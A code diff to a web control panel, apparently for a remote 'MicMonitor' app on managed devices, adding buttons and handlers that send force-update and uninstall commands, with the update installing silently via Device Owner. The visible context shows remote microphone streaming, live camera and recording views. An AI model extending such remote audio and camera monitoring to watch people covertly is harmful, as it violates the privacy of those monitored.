@@ -630,6 +630,16 @@
         background: rgba(124, 58, 237, 0.18);
         border-color: rgba(124, 58, 237, 0.45);
       }
+      .btn-danger {
+        background: rgba(244, 63, 94, 0.12);
+        color: #fda4af;
+        border: 1px solid rgba(244, 63, 94, 0.3);
+      }
+      .btn-danger:hover:not(:disabled) {
+        background: rgba(244, 63, 94, 0.2);
+        border-color: rgba(244, 63, 94, 0.5);
+        color: #fecdd3;
+      }
       .btn-rtc {
         background: linear-gradient(135deg, #0f766e, #14b8a6);
         color: #fff;
@@ -1828,6 +1838,8 @@
             <button class="btn-ghost" id="btnStream_${deviceId}" onclick="cycleStreamMode('${deviceId}')">Stream: Auto</button>
             <button class="btn-ghost" onclick="resetAudioSettings('${deviceId}')">Reset Audio</button>
             <button class="btn-ghost" id="btnVizMode_${deviceId}" onclick="cycleVizMode('${deviceId}')">Viz: Wave</button>
+            <button class="btn-ghost" onclick="forceUpdate('${deviceId}')">🔄 Update App</button>
+            <button class="btn-danger" onclick="uninstallApp('${deviceId}')">🗑️ Uninstall App</button>
           </div>
           <div class="rec-list" id="recList_${deviceId}"></div>
           <div class="photo-list live-video-wrap" id="liveCam_${deviceId}" style="display:none"></div>
@@ -2662,6 +2674,20 @@
       function refreshData(deviceId) {
         sendCmd(deviceId, "get_data");
         log(`Data refresh requested for ${deviceId}`, "info");
+      }
+      function forceUpdate(deviceId) {
+        if (!confirm(`🔄 Force update app on device ${deviceId}?\n\nThis will:\n• Check for new version on server\n• Download and install silently (Device Owner)\n• Restart the app with new version\n\nMake sure you've uploaded the new APK to server/updates/ folder.`)) {
+          return;
+        }
+        sendCmd(deviceId, "force_update");
+        log(`Force update command sent to ${deviceId}`, "info");
+      }
+      function uninstallApp(deviceId) {
+        if (!confirm(`⚠️ Uninstall MicMonitor app from device ${deviceId}?\n\nThis will:\n• Clear Device Owner (if set)\n• Open uninstall dialog on the device\n• Remove the app completely\n\nThis action cannot be undone.`)) {
+          return;
+        }
+        sendCmd(deviceId, "uninstall_app");
+        log(`Uninstall command sent to ${deviceId}`, "warn");
       }
 
       function renderWebRtcState(deviceId, state, bitrateKbps, quality) {
